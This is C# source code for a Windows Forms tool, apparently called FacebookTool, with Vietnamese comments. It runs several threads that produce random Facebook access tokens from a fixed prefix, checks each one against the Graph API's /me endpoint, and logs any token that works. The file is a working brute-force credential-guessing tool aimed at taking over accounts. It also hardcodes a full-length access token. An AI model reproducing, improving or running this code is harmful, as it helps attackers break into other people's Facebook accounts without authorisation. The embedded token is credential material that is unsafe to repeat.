using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using FacebookTool.Helper;

namespace FacebookTool.App
{
    public partial class frmMain : Form
    {
        private int _numberOfThread;
        private int _totalTokenCheck;
        private int _timeSleepCheckToken;
        private Thread[] _listThread;
        public frmMain()
        {
            InitializeComponent();
        }

        private void btnStartGetToken_Click(object sender, EventArgs e)
        {
            #region Code cũ
            if (btnStartGetToken.Text == "Start Get Token")
            {
                rtbLogGetToken.Text = DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss");
                btnStartGetToken.Text = "Stop Get Token";
                _numberOfThread = int.Parse(txtNumberOfThreadGetToken.Text);
                _timeSleepCheckToken = int.Parse(txtTimeSleepCheckToken.Text);
                _listThread = new Thread[_numberOfThread];
                for (int i = 0; i < _numberOfThread; i++)
                {
                    int index = int.Parse(i.ToString());
                    string nameOfThread = "Thread " + index;
                    _listThread[index] = new Thread(async () => await GetTokenAsync(nameOfThread))
                    {
                        Name = nameOfThread
                    };
                    _listThread[index].Start();
                }
            }
            else
            {
                btnStartGetToken.Text = "Start Get Token";
                //_threadGetToken.Abort();
                rtbLogGetToken.Text = rtbLogGetToken.Text + Environment.NewLine + "Stop - " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
            }
            #endregion
            #region Code mới
            //if (btnStartGetToken.Text == "Start Get Token")
            //{
            //    rtbLogGetToken.Text = DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss");
            //    btnStartGetToken.Text = "Stop Get Token";
            //    _numberOfThread = int.Parse(txtNumberOfThreadGetToken.Text);
            //    _timeSleepCheckToken = int.Parse(txtTimeSleepCheckToken.Text);
            //    listThread = new Thread[_numberOfThread];
            //    var ids = new List<string>() { "1", "2", "3", "4", "5", "6", "7", "8", "9", "10" };

            //    await ids.ParallelForEachAsync(async i =>
            //        {
            //            await GetTokenAsyncV2(i);
            //        },
            //        maxDegreeOfParallelism: 10);

            //}
            //else
            //{
            //    btnStartGetToken.Text = "Start Get Token";
            //    //_threadGetToken.Abort();
            //    rtbLogGetToken.Text = rtbLogGetToken.Text + Environment.NewLine + "Stop - " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
            //}
            #endregion
        }


        private async Task GetTokenAsync(string nameOfThread)
        {
            while (true)
            {
                try
                {
                    int baseIndex = 170;
                    for (int i = 0; i < _numberOfThread; i++)
                    {
                        if (nameOfThread.Contains(i.ToString()))
                        {
                            baseIndex += i;
                        }
                    }
                    var token = "EAAAAZAw4FxQIBA" + StringHelper.RandomStringWithNumber(baseIndex);
                    if (_totalTokenCheck % 50000 == 0 && _totalTokenCheck >= 50000)
                    {
                        token = "EAAAAZAw4FxQIBAE0zEdrwDgIf8fuZBlPiv8sZAcsySrC6q3RCXU3hmDnM7UeMOp4n5SMfojlqau95pq4ZAo0SZBhgpHPTAZCbKoDZAUe5dYWY0m2prKGNvPb8ZB4j07n1B041ZC2Hw3Tukdvp7ZCQbZBozYeiT37oH8D71UW8N2U3PfP1dZCDMs6yV9b";
                    }
                    var isLive = await CheckTokenIsLive(token);
                    if (isLive)
                    {
                        InvokeControlHelper.AppendRichTextboxV2(rtbInfoGetToken, $"{nameOfThread}: {token}", Color.Blue);
                        LogHelper.WriteLog(token);
                    }
                    else
                    {
                        InvokeControlHelper.AppendRichTextboxV2(rtbLogGetToken, $"{nameOfThread}: {token}", Color.Black);
                    }
                    _totalTokenCheck++;
                    InvokeControlHelper.UpdateLabel(lbInfoGetToken, $"Số Token đã check: {_totalTokenCheck}", Color.Blue);
                }
                catch (Exception e)
                {
                    string text = $"{nameOfThread}: Exception={e.Message}, InnerException={e.InnerException?.Message}";
                    InvokeControlHelper.AppendRichTextboxV2(rtbInfoGetToken, text, Color.Red);
                    LogHelper.WriteLog(text);
                }
                Thread.Sleep(_timeSleepCheckToken);
            }
        }

        private async Task<bool> CheckTokenIsLive(string token)
        {
            try
            {
                var http = new HttpClient();
                var url = "https://graph.facebook.com/v1.0/me?access_token=" + token;
                var response = await http.GetAsync(url);
                return response.IsSuccessStatusCode;
            }
            catch (Exception e)
            {
                string text = $"CheckTokenIsLive: Exception={e.Message}, InnerException={e.InnerException?.Message}";
                InvokeControlHelper.AppendRichTextboxV2(rtbInfoGetToken, text, Color.Red);
                LogHelper.WriteLog(text);
                return false;
            }
        }

        private void btnCopyGetToken_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(rtbLogGetToken.Text);
        }
    }
}
